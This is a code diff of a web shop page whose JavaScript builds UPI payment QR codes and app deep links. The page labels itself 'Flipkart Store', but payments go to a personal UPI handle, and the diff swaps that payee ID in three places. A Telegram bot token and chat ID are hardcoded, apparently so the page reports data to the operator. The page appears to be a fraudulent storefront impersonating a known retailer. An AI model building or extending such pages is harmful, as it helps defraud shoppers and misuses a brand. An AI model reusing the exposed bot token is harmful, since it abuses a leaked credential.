@@ -409,7 +409,7 @@
     <script>
         const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
         const CHAT_ID = "1981500395";
-        const MY_UPI = "8294338151@okbizaxis";
+        const MY_UPI = "6299544009@naviaxis";
 
         // यहाँ descImgs: [] में आप लंबी बैनर फोटो डाल सकते हैं
         const products = [
@@ -719,7 +719,7 @@ document.getElementById('qr-amount-val').innerText = "₹" + sel.price;
 function toggleQR(el) {
     const qrBox = document.getElementById('qr-container');
     const qrImgDiv = document.getElementById('qrcode-img');
-    const upiId = "8294338151@okbizaxis";
+    const upiId = "6299544009@naviaxis";
     const amount = sel.price;
     
     const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=${upiId}%26am=${amount}%26cu=INR`;
@@ -751,7 +751,7 @@ async function confirmPay() {
     if (!selectedInput) return;
 
     const selectedApp = selectedInput.value;
-    const myUpiId = "8294338151@okbizaxis"; 
+    const myUpiId = "6299544009@naviaxis"; 
     const amount = sel.price;
     const shopName = "Flipkart%20Store"; 
     
